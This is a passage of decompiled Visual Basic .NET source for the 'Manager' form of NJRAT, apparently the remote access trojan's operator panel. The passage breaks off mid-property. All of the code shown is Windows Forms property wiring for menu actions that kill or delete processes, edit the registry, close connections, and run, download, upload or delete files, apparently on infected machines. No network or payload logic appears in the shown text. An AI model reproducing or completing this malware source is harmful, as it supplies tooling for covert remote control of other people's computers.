Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000012 RID: 18
	<DesignerGenerated()>
	Public Partial Class Manager
		Inherits Form

		' Token: 0x060002D2 RID: 722 RVA: 0x0001B6C8 File Offset: 0x000198C8
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Manager.__ENCList
			SyncLock _ENCList
				If Manager.__ENCList.Count = Manager.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Manager.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Manager.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Manager.__ENCList(num) = Manager.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Manager.__ENCList.RemoveRange(num, Manager.__ENCList.Count - num)
					Manager.__ENCList.Capacity = Manager.__ENCList.Count
				End If
				Manager.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000107 RID: 263
		' (get) Token: 0x060002D5 RID: 725 RVA: 0x0001E908 File Offset: 0x0001CB08
		' (set) Token: 0x060002D6 RID: 726 RVA: 0x000028C1 File Offset: 0x00000AC1
		Friend Overridable Property StatusStrip1 As StatusStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._StatusStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As StatusStrip)
				Me._StatusStrip1 = value
			End Set
		End Property

		' Token: 0x17000108 RID: 264
		' (get) Token: 0x060002D7 RID: 727 RVA: 0x0001E920 File Offset: 0x0001CB20
		' (set) Token: 0x060002D8 RID: 728 RVA: 0x0001E938 File Offset: 0x0001CB38
		Friend Overridable Property SL As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._SL
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.SL_Click
				If Me._SL IsNot Nothing Then
					RemoveHandler Me._SL.Click, value2
				End If
				Me._SL = value
				If Me._SL IsNot Nothing Then
					AddHandler Me._SL.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000109 RID: 265
		' (get) Token: 0x060002D9 RID: 729 RVA: 0x0001E990 File Offset: 0x0001CB90
		' (set) Token: 0x060002DA RID: 730 RVA: 0x000028CA File Offset: 0x00000ACA
		Friend Overridable Property pr As ToolStripProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._pr
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripProgressBar)
				Me._pr = value
			End Set
		End Property

		' Token: 0x1700010A RID: 266
		' (get) Token: 0x060002DB RID: 731 RVA: 0x0001E9A8 File Offset: 0x0001CBA8
		' (set) Token: 0x060002DC RID: 732 RVA: 0x000028D3 File Offset: 0x00000AD3
		Friend Overridable Property M1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._M1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._M1 = value
			End Set
		End Property

		' Token: 0x1700010B RID: 267
		' (get) Token: 0x060002DD RID: 733 RVA: 0x0001E9C0 File Offset: 0x0001CBC0
		' (set) Token: 0x060002DE RID: 734 RVA: 0x0001E9D8 File Offset: 0x0001CBD8
		Friend Overridable Property KillToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillToolStripMenuItem1_Click
				If Me._KillToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._KillToolStripMenuItem1.Click, value2
				End If
				Me._KillToolStripMenuItem1 = value
				If Me._KillToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._KillToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700010C RID: 268
		' (get) Token: 0x060002DF RID: 735 RVA: 0x0001EA30 File Offset: 0x0001CC30
		' (set) Token: 0x060002E0 RID: 736 RVA: 0x0001EA48 File Offset: 0x0001CC48
		Friend Overridable Property KillDeleteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillDeleteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillDeleteToolStripMenuItem_Click
				If Me._KillDeleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._KillDeleteToolStripMenuItem.Click, value2
				End If
				Me._KillDeleteToolStripMenuItem = value
				If Me._KillDeleteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._KillDeleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700010D RID: 269
		' (get) Token: 0x060002E1 RID: 737 RVA: 0x0001EAA0 File Offset: 0x0001CCA0
		' (set) Token: 0x060002E2 RID: 738 RVA: 0x0001EAB8 File Offset: 0x0001CCB8
		Friend Overridable Property RestartProcessToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartProcessToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartProcessToolStripMenuItem_Click
				If Me._RestartProcessToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RestartProcessToolStripMenuItem.Click, value2
				End If
				Me._RestartProcessToolStripMenuItem = value
				If Me._RestartProcessToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RestartProcessToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700010E RID: 270
		' (get) Token: 0x060002E3 RID: 739 RVA: 0x0001EB10 File Offset: 0x0001CD10
		' (set) Token: 0x060002E4 RID: 740 RVA: 0x0001EB28 File Offset: 0x0001CD28
		Friend Overridable Property vmethod_26 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_26
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_26_Tick
				If Me._vmethod_26 IsNot Nothing Then
					RemoveHandler Me._vmethod_26.Tick, value2
				End If
				Me._vmethod_26 = value
				If Me._vmethod_26 IsNot Nothing Then
					AddHandler Me._vmethod_26.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700010F RID: 271
		' (get) Token: 0x060002E5 RID: 741 RVA: 0x0001EB80 File Offset: 0x0001CD80
		' (set) Token: 0x060002E6 RID: 742 RVA: 0x000028DC File Offset: 0x00000ADC
		Friend Overridable Property ImageList1 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._ImageList1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._ImageList1 = value
			End Set
		End Property

		' Token: 0x17000110 RID: 272
		' (get) Token: 0x060002E7 RID: 743 RVA: 0x0001EB98 File Offset: 0x0001CD98
		' (set) Token: 0x060002E8 RID: 744 RVA: 0x000028E5 File Offset: 0x00000AE5
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000111 RID: 273
		' (get) Token: 0x060002E9 RID: 745 RVA: 0x0001EBB0 File Offset: 0x0001CDB0
		' (set) Token: 0x060002EA RID: 746 RVA: 0x0001EBC8 File Offset: 0x0001CDC8
		Friend Overridable Property KillConnectionToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillConnectionToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillConnectionToolStripMenuItem_Click
				If Me._KillConnectionToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._KillConnectionToolStripMenuItem.Click, value2
				End If
				Me._KillConnectionToolStripMenuItem = value
				If Me._KillConnectionToolStripMenuItem IsNot Nothing Then
					AddHandler Me._KillConnectionToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000112 RID: 274
		' (get) Token: 0x060002EB RID: 747 RVA: 0x0001EC20 File Offset: 0x0001CE20
		' (set) Token: 0x060002EC RID: 748 RVA: 0x000028EE File Offset: 0x00000AEE
		Friend Overridable Property crg As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._crg
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._crg = value
			End Set
		End Property

		' Token: 0x17000113 RID: 275
		' (get) Token: 0x060002ED RID: 749 RVA: 0x0001EC38 File Offset: 0x0001CE38
		' (set) Token: 0x060002EE RID: 750 RVA: 0x0001EC50 File Offset: 0x0001CE50
		Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem_Click
				If Me._RefreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem = value
				If Me._RefreshToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000114 RID: 276
		' (get) Token: 0x060002EF RID: 751 RVA: 0x0001ECA8 File Offset: 0x0001CEA8
		' (set) Token: 0x060002F0 RID: 752 RVA: 0x0001ECC0 File Offset: 0x0001CEC0
		Friend Overridable Property EditToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._EditToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem_Click
				If Me._EditToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._EditToolStripMenuItem.Click, value2
				End If
				Me._EditToolStripMenuItem = value
				If Me._EditToolStripMenuItem IsNot Nothing Then
					AddHandler Me._EditToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000115 RID: 277
		' (get) Token: 0x060002F1 RID: 753 RVA: 0x0001ED18 File Offset: 0x0001CF18
		' (set) Token: 0x060002F2 RID: 754 RVA: 0x0001ED30 File Offset: 0x0001CF30
		Friend Overridable Property NewValueToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewValueToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewValueToolStripMenuItem_Click
				If Me._NewValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._NewValueToolStripMenuItem.Click, value2
				End If
				Me._NewValueToolStripMenuItem = value
				If Me._NewValueToolStripMenuItem IsNot Nothing Then
					AddHandler Me._NewValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000116 RID: 278
		' (get) Token: 0x060002F3 RID: 755 RVA: 0x0001ED88 File Offset: 0x0001CF88
		' (set) Token: 0x060002F4 RID: 756 RVA: 0x0001EDA0 File Offset: 0x0001CFA0
		Friend Overridable Property DeleteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem_Click
				If Me._DeleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DeleteToolStripMenuItem.Click, value2
				End If
				Me._DeleteToolStripMenuItem = value
				If Me._DeleteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DeleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000117 RID: 279
		' (get) Token: 0x060002F5 RID: 757 RVA: 0x0001EDF8 File Offset: 0x0001CFF8
		' (set) Token: 0x060002F6 RID: 758 RVA: 0x000028F7 File Offset: 0x00000AF7
		Friend Overridable Property rimg As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._rimg
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._rimg = value
			End Set
		End Property

		' Token: 0x17000118 RID: 280
		' (get) Token: 0x060002F7 RID: 759 RVA: 0x0001EE10 File Offset: 0x0001D010
		' (set) Token: 0x060002F8 RID: 760 RVA: 0x00002900 File Offset: 0x00000B00
		Friend Overridable Property crgk As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._crgk
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._crgk = value
			End Set
		End Property

		' Token: 0x17000119 RID: 281
		' (get) Token: 0x060002F9 RID: 761 RVA: 0x0001EE28 File Offset: 0x0001D028
		' (set) Token: 0x060002FA RID: 762 RVA: 0x0001EE40 File Offset: 0x0001D040
		Friend Overridable Property RefreshToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem1_Click
				If Me._RefreshToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem1.Click, value2
				End If
				Me._RefreshToolStripMenuItem1 = value
				If Me._RefreshToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011A RID: 282
		' (get) Token: 0x060002FB RID: 763 RVA: 0x0001EE98 File Offset: 0x0001D098
		' (set) Token: 0x060002FC RID: 764 RVA: 0x0001EEB0 File Offset: 0x0001D0B0
		Friend Overridable Property CreateKeyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CreateKeyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CreateKeyToolStripMenuItem_Click
				If Me._CreateKeyToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CreateKeyToolStripMenuItem.Click, value2
				End If
				Me._CreateKeyToolStripMenuItem = value
				If Me._CreateKeyToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CreateKeyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011B RID: 283
		' (get) Token: 0x060002FD RID: 765 RVA: 0x0001EF08 File Offset: 0x0001D108
		' (set) Token: 0x060002FE RID: 766 RVA: 0x0001EF20 File Offset: 0x0001D120
		Friend Overridable Property DeleteSelectedToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteSelectedToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteSelectedToolStripMenuItem_Click
				If Me._DeleteSelectedToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DeleteSelectedToolStripMenuItem.Click, value2
				End If
				Me._DeleteSelectedToolStripMenuItem = value
				If Me._DeleteSelectedToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DeleteSelectedToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011C RID: 284
		' (get) Token: 0x060002FF RID: 767 RVA: 0x0001EF78 File Offset: 0x0001D178
		' (set) Token: 0x06000300 RID: 768 RVA: 0x00002909 File Offset: 0x00000B09
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip2 = value
			End Set
		End Property

		' Token: 0x1700011D RID: 285
		' (get) Token: 0x06000301 RID: 769 RVA: 0x0001EF90 File Offset: 0x0001D190
		' (set) Token: 0x06000302 RID: 770 RVA: 0x0001EFA8 File Offset: 0x0001D1A8
		Friend Overridable Property StopToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._StopToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StopToolStripMenuItem_Click
				If Me._StopToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._StopToolStripMenuItem.Click, value2
				End If
				Me._StopToolStripMenuItem = value
				If Me._StopToolStripMenuItem IsNot Nothing Then
					AddHandler Me._StopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011E RID: 286
		' (get) Token: 0x06000303 RID: 771 RVA: 0x0001F000 File Offset: 0x0001D200
		' (set) Token: 0x06000304 RID: 772 RVA: 0x0001F018 File Offset: 0x0001D218
		Friend Overridable Property PauseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._PauseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PauseToolStripMenuItem_Click
				If Me._PauseToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._PauseToolStripMenuItem.Click, value2
				End If
				Me._PauseToolStripMenuItem = value
				If Me._PauseToolStripMenuItem IsNot Nothing Then
					AddHandler Me._PauseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011F RID: 287
		' (get) Token: 0x06000305 RID: 773 RVA: 0x0001F070 File Offset: 0x0001D270
		' (set) Token: 0x06000306 RID: 774 RVA: 0x0001F088 File Offset: 0x0001D288
		Friend Overridable Property StartToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._StartToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StartToolStripMenuItem_Click
				If Me._StartToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._StartToolStripMenuItem.Click, value2
				End If
				Me._StartToolStripMenuItem = value
				If Me._StartToolStripMenuItem IsNot Nothing Then
					AddHandler Me._StartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000120 RID: 288
		' (get) Token: 0x06000307 RID: 775 RVA: 0x0001F0E0 File Offset: 0x0001D2E0
		' (set) Token: 0x06000308 RID: 776 RVA: 0x00002912 File Offset: 0x00000B12
		Friend Overridable Property ContextMenuStrip3 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip3 = value
			End Set
		End Property

		' Token: 0x17000121 RID: 289
		' (get) Token: 0x06000309 RID: 777 RVA: 0x0001F0F8 File Offset: 0x0001D2F8
		' (set) Token: 0x0600030A RID: 778 RVA: 0x0001F110 File Offset: 0x0001D310
		Friend Overridable Property UPToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UPToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UPToolStripMenuItem_Click
				If Me._UPToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UPToolStripMenuItem.Click, value2
				End If
				Me._UPToolStripMenuItem = value
				If Me._UPToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UPToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000122 RID: 290
		' (get) Token: 0x0600030B RID: 779 RVA: 0x0001F168 File Offset: 0x0001D368
		' (set) Token: 0x0600030C RID: 780 RVA: 0x0001F180 File Offset: 0x0001D380
		Friend Overridable Property RefreshToolStripMenuItem2 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem2_Click
				If Me._RefreshToolStripMenuItem2 IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem2.Click, value2
				End If
				Me._RefreshToolStripMenuItem2 = value
				If Me._RefreshToolStripMenuItem2 IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000123 RID: 291
		' (get) Token: 0x0600030D RID: 781 RVA: 0x0001F1D8 File Offset: 0x0001D3D8
		' (set) Token: 0x0600030E RID: 782 RVA: 0x0001F1F0 File Offset: 0x0001D3F0
		Friend Overridable Property RunToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RunToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RunToolStripMenuItem_Click
				If Me._RunToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RunToolStripMenuItem.Click, value2
				End If
				Me._RunToolStripMenuItem = value
				If Me._RunToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RunToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000124 RID: 292
		' (get) Token: 0x0600030F RID: 783 RVA: 0x0001F248 File Offset: 0x0001D448
		' (set) Token: 0x06000310 RID: 784 RVA: 0x0001F260 File Offset: 0x0001D460
		Friend Overridable Property DeleteToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem1_Click
				If Me._DeleteToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._DeleteToolStripMenuItem1.Click, value2
				End If
				Me._DeleteToolStripMenuItem1 = value
				If Me._DeleteToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._DeleteToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000125 RID: 293
		' (get) Token: 0x06000311 RID: 785 RVA: 0x0001F2B8 File Offset: 0x0001D4B8
		' (set) Token: 0x06000312 RID: 786 RVA: 0x0001F2D0 File Offset: 0x0001D4D0
		Friend Overridable Property EditToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._EditToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem1_Click
				If Me._EditToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._EditToolStripMenuItem1.Click, value2
				End If
				Me._EditToolStripMenuItem1 = value
				If Me._EditToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._EditToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000126 RID: 294
		' (get) Token: 0x06000313 RID: 787 RVA: 0x0001F328 File Offset: 0x0001D528
		' (set) Token: 0x06000314 RID: 788 RVA: 0x0001F340 File Offset: 0x0001D540
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RenameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RenameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000127 RID: 295
		' (get) Token: 0x06000315 RID: 789 RVA: 0x0001F398 File Offset: 0x0001D598
		' (set) Token: 0x06000316 RID: 790 RVA: 0x0001F3B0 File Offset: 0x0001D5B0
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000128 RID: 296
		' (get) Token: 0x06000317 RID: 791 RVA: 0x0001F408 File Offset: 0x0001D608
		' (set) Token: 0x06000318 RID: 792 RVA: 0x0001F420 File Offset: 0x0001D620
		Friend Overridable Property CutToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CutToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CutToolStripMenuItem_Click
				If Me._CutToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CutToolStripMenuItem.Click, value2
				End If
				Me._CutToolStripMenuItem = value
				If Me._CutToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CutToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000129 RID: 297
		' (get) Token: 0x06000319 RID: 793 RVA: 0x0001F478 File Offset: 0x0001D678
		' (set) Token: 0x0600031A RID: 794 RVA: 0x0001F490 File Offset: 0x0001D690
		Friend Overridable Property PasteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._PasteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PasteToolStripMenuItem_Click
				If Me._PasteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._PasteToolStripMenuItem.Click, value2
				End If
				Me._PasteToolStripMenuItem = value
				If Me._PasteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._PasteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012A RID: 298
		' (get) Token: 0x0600031B RID: 795 RVA: 0x0001F4E8 File Offset: 0x0001D6E8
		' (set) Token: 0x0600031C RID: 796 RVA: 0x0001F500 File Offset: 0x0001D700
		Friend Overridable Property DownloadToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DownloadToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DownloadToolStripMenuItem_Click
				If Me._DownloadToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DownloadToolStripMenuItem.Click, value2
				End If
				Me._DownloadToolStripMenuItem = value
				If Me._DownloadToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DownloadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012B RID: 299
		' (get) Token: 0x0600031D RID: 797 RVA: 0x0001F558 File Offset: 0x0001D758
		' (set) Token: 0x0600031E RID: 798 RVA: 0x0001F570 File Offset: 0x0001D770
		Friend Overridable Property UploadToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
